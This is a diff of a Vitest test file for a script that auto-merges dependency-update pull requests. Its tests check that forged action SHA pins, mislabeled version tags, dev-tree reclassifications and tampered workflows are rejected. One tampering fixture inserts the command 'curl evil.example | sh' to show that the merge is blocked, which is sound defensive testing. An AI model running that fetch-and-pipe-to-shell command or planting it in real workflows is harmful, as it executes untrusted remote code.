@@ -1,9 +1,10 @@
 import { describe, expect, it } from "vitest";
 
 import {
-  allowedPathsFor,
-  classifyVersionChange,
   actionVersion,
+  allowedPathsFor,
+  classifyActionRef,
+  classifyVersionChange,
   collectResolvedUrls,
   deriveLockfileUpdates,
   deriveManifestUpdates,
@@ -17,14 +18,16 @@ import {
   evaluateUpdates,
   evaluateWorkflowChanges,
   identifySource,
-  resolvedUrlMatchesPackage,
+  lockEntryDependencyType,
   parseDependabotUpdates,
   parseSnykUpdate,
   preflight,
   REQUIRED_CHECKS,
   resolveDependencyType,
+  resolvedUrlMatchesPackage,
   run,
   SNYK_AUTHORS,
+  verifyActionReferences,
 } from "../../.github/scripts/auto-merge-dependency-updates.js";
 
 // Verbatim commit message from streetlives/yourpeer.nyc#719, a single-dependency
@@ -742,6 +745,17 @@ function fakeGithub(state: any) {
           calls.comments.push(params);
         },
       },
+      git: {
+        getRef: async ({ owner, repo, ref }: any) => {
+          const sha =
+            state.tags?.[`${owner}/${repo}@${ref.replace("tags/", "")}`];
+          if (!sha) throw new Error("Not Found");
+          return { data: { object: { type: "commit", sha } } };
+        },
+        getTag: async () => {
+          throw new Error("Not Found");
+        },
+      },
     },
   };
 
@@ -1118,10 +1132,13 @@ updated-dependencies:
 
 Signed-off-by: dependabot[bot] <support@github.com>`;
 
-function bumpCheckout(workflow: string, version: string) {
+const SHA_V5_0_1 = "93cb6efe18208431cddfb8368fd83d5badbf9bfd";
+const SHA_V5_0_2 = "1111111111111111111111111111111111111111";
+
+function bumpCheckout(workflow: string, version: string, sha = SHA_V5_0_2) {
   return workflow.replace(
-    "93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1 (tag v5)",
-    `1111111111111111111111111111111111111111 # v${version} (tag v5)`,
+    `${SHA_V5_0_1} # v5.0.1 (tag v5)`,
+    `${sha} # v${version} (tag v5)`,
   );
 }
 
@@ -1140,11 +1157,17 @@ function actionsPull(overrides: any = {}) {
 
 describe("workflow updates", () => {
   it("reads the version from a tag or from the comment on a SHA pin", () => {
-    expect(actionVersion({ ref: "v5.0.1", comment: "" })).toBe("v5.0.1");
+    expect(actionVersion({ ref: "v5.0.1", comment: "" })).toBe("5.0.1");
+    expect(actionVersion({ ref: "v5", comment: "" })).toBe("5.0.0");
     expect(
-      actionVersion({ ref: "93cb6efe1820", comment: " # v5.0.1 (tag v5)" }),
-    ).toBe("v5.0.1");
-    expect(actionVersion({ ref: "93cb6efe1820", comment: "" })).toBeNull();
+      actionVersion({ ref: SHA_V5_0_1, comment: " # v5.0.1 (tag v5)" }),
+    ).toBe("5.0.1");
+    expect(actionVersion({ ref: SHA_V5_0_1, comment: "" })).toBeNull();
+
+    // The executable reference wins: a comment cannot describe v6 as a patch.
+    expect(actionVersion({ ref: "v6", comment: " # v5.0.2 (tag v5)" })).toBe(
+      "6.0.0",
+    );
   });
 
   it("accepts a reference bump", () => {
@@ -1154,8 +1177,10 @@ describe("workflow updates", () => {
       updates: [
         {
           name: "actions/checkout",
-          fromVersion: "v5.0.1",
-          toVersion: "v5.0.2",
+          fromVersion: "5.0.1",
+          toVersion: "5.0.2",
+          toRef: SHA_V5_0_2,
+          toRefKind: "sha",
           dependencyType: "github-action",
           removed: false,
         },
@@ -1231,19 +1256,23 @@ describe("workflow updates", () => {
       },
     });
 
-    const clean = fakeGithub(state(bumpCheckout(WORKFLOW, "5.0.2")));
+    const clean = fakeGithub({
+      ...state(bumpCheckout(WORKFLOW, "5.0.2")),
+      tags: { "actions/checkout@v5.0.2": SHA_V5_0_2 },
+    });
     await run({ github: clean.github, context: CONTEXT, core: CORE });
     expect(clean.calls.merges).toHaveLength(1);
 
     // Same patch-sized trailer, but a command has been swapped underneath it.
-    const tampered = fakeGithub(
-      state(
+    const tampered = fakeGithub({
+      ...state(
         bumpCheckout(WORKFLOW, "5.0.2").replace(
           "npm run test:unit:run",
           "curl evil.example | sh",
         ),
       ),
-    );
+      tags: { "actions/checkout@v5.0.2": SHA_V5_0_2 },
+    });
     await run({ github: tampered.github, context: CONTEXT, core: CORE });
     expect(tampered.calls.merges).toHaveLength(0);
   });
@@ -1334,5 +1363,243 @@ describe("registry tarball identity", () => {
     expect(evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST).safe).toBe(
       true,
     );
+  });
+});
+
+describe("a version comment is a claim, not proof", () => {
+  it("classifies what the reference actually is", () => {
+    expect(classifyActionRef("v5.0.1")).toEqual({
+      kind: "tag",
+      version: "5.0.1",
+    });
+    expect(classifyActionRef("v5")).toEqual({ kind: "tag", version: "5.0.0" });
+    expect(classifyActionRef(SHA_V5_0_1)).toEqual({ kind: "sha" });
+    expect(classifyActionRef("main")).toEqual({ kind: "unknown" });
+  });
+
+  it("rejects a major tag wearing a patch comment", () => {
+    // @v6 executes v6 whatever "# v5.0.2" says next to it.
+    const changes = [
+      {
+        path: ".github/workflows/tests.yml",
+        baseText: WORKFLOW,
+        headText: WORKFLOW.replace(
+          `${SHA_V5_0_1} # v5.0.1 (tag v5)`,
+          "v6 # v5.0.2 (tag v5)",
+        ),
+      },
+    ];
+    const result = evaluateWorkflowChanges(changes, ["actions/checkout"]);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("major");
+  });
+
+  it("verifies a SHA pin against the action's real tags", async () => {
+    const github = {
+      rest: {
+        git: {
+          getRef: async ({ ref }: any) => {
+            if (ref !== "tags/v5.0.2") throw new Error("Not Found");
+            return { data: { object: { type: "commit", sha: SHA_V5_0_2 } } };
+          },
+          getTag: async () => {
+            throw new Error("Not Found");
+          },
+        },
+      },
+    };
+    const update = (toRef: string, toVersion: string | null) => [
+      { name: "actions/checkout", toRef, toRefKind: "sha", toVersion },
+    ];
+
+    expect(
+      (await verifyActionReferences(github, update(SHA_V5_0_2, "5.0.2"))).safe,
+    ).toBe(true);
+
+    // An arbitrary SHA claiming to be that release.
+    const forged = await verifyActionReferences(
+      github,
+      update("f".repeat(40), "5.0.2"),
+    );
+    expect(forged.safe).toBe(false);
+    expect(forged.reason).toContain("is not the commit tagged 5.0.2");
+
+    // A real release SHA relabelled as a different version.
+    expect(
+      (await verifyActionReferences(github, update(SHA_V5_0_2, "5.0.3"))).safe,
+    ).toBe(false);
+
+    // A SHA pin with no version at all.
+    expect(
+      (await verifyActionReferences(github, update(SHA_V5_0_2, null))).safe,
+    ).toBe(false);
+  });
+
+  it("follows an annotated tag to its commit", async () => {
+    const github = {
+      rest: {
+        git: {
+          getRef: async () => ({
+            data: { object: { type: "tag", sha: "tagobject" } },
+          }),
+          getTag: async ({ tag_sha }: any) => ({
+            data: {
+              object: { sha: tag_sha === "tagobject" ? SHA_V5_0_2 : "x" },
+            },
+          }),
+        },
+      },
+    };
+    expect(
+      (
+        await verifyActionReferences(github, [
+          {
+            name: "actions/checkout",
+            toRef: SHA_V5_0_2,
+            toRefKind: "sha",
+            toVersion: "5.0.2",
+          },
+        ])
+      ).safe,
+    ).toBe(true);
+  });
+
+  it("needs no tag lookup for a reference that carries its own version", async () => {
+    const github = {
+      rest: {
+        git: {
+          getRef: async () => {
+            throw new Error("should not be called");
+          },
+          getTag: async () => {
+            throw new Error("should not be called");
+          },
+        },
+      },
+    };
+    expect(
+      (
+        await verifyActionReferences(github, [
+          {
+            name: "actions/checkout",
+            toRef: "v5.0.2",
+            toRefKind: "tag",
+            toVersion: "5.0.2",
+          },
+        ])
+      ).safe,
+    ).toBe(true);
+  });
+
+  it("merges nothing when a pull request pins a SHA no release points at", async () => {
+    const { github, calls } = fakeGithub({
+      pull: actionsPull(),
+      files: [".github/workflows/tests.yml"],
+      commits: [ACTION_BUMP_COMMIT],
+      contents: {
+        "basesha1:.github/workflows/tests.yml": WORKFLOW,
+        "headsha1:.github/workflows/tests.yml": bumpCheckout(
+          WORKFLOW,
+          "5.0.2",
+          "a".repeat(40),
+        ),
+      },
+      tags: { "actions/checkout@v5.0.2": SHA_V5_0_2 },
+    });
+
+    await run({ github, context: CONTEXT, core: CORE });
+
+    expect(calls.merges).toHaveLength(0);
+  });
+});
+
+describe("the dev tree is read from the merge target, not from the pull request", () => {
+  const entry = (version: string, dev: boolean) => ({
+    "node_modules/deep": {
+      version,
+      resolved: `https://registry.npmjs.org/deep/-/deep-${version}.tgz`,
+      integrity: `sha512-${version}`,
+      ...(dev ? { dev: true } : {}),
+    },
+  });
+
+  it("types an entry from the base lockfile and the base manifest", () => {
+    expect(
+      lockEntryDependencyType("node_modules/deep", { dev: true }, {}),
+    ).toBe("direct:development");
+    expect(lockEntryDependencyType("node_modules/deep", {}, {})).toBe(
+      "indirect",
+    );
+    expect(
+      lockEntryDependencyType(
+        "node_modules/axios",
+        { dev: true },
+        BASE_MANIFEST,
+      ),
+    ).toBe("direct:production");
+  });
+
+  it("rejects a production package reclassified as dev in the same diff", () => {
+    const result = evaluateLockfileChanges(
+      lockfile(entry("1.0.0", false)),
+      lockfile(entry("1.1.0", true)),
+      {},
+    );
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("into the dev tree");
+  });
+
+  it("rejects the reverse reclassification too", () => {
+    const result = evaluateLockfileChanges(
+      lockfile(entry("1.0.0", true)),
+      lockfile(entry("1.0.1", false)),
+      {},
+    );
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("out of the dev tree");
+  });
+
+  it("still allows an honest dev-tree minor and still blocks a production one", () => {
+    expect(
+      evaluateLockfileChanges(
+        lockfile(entry("1.0.0", true)),
+        lockfile(entry("1.1.0", true)),
+        {},
+      ).safe,
+    ).toBe(true);
+    expect(
+      evaluateLockfileChanges(
+        lockfile(entry("1.0.0", false)),
+        lockfile(entry("1.1.0", false)),
+        {},
+      ).safe,
+    ).toBe(false);
+  });
+
+  it("merges nothing when a patch pull request reclassifies a package to widen the policy", async () => {
+    const base = lockfile({
+      ...BASE_LOCK.packages,
+      ...entry("1.0.0", false),
+    });
+    const head = lockfile({
+      ...BASE_LOCK.packages,
+      ...entry("1.1.0", true),
+    });
+
+    const { github, calls } = fakeGithub({
+      pull: pull(),
+      files: ["package-lock.json"],
+      commits: [PATCH_COMMIT],
+      contents: {
+        "basesha1:package.json": BASE_MANIFEST,
+        "headsha1:package.json": BASE_MANIFEST,
+        "basesha1:package-lock.json": base,
+        "headsha1:package-lock.json": head,
+      },
+    });
+
+    await run({ github, context: CONTEXT, core: CORE });
+
+    expect(calls.merges).toHaveLength(0);
   });
 });
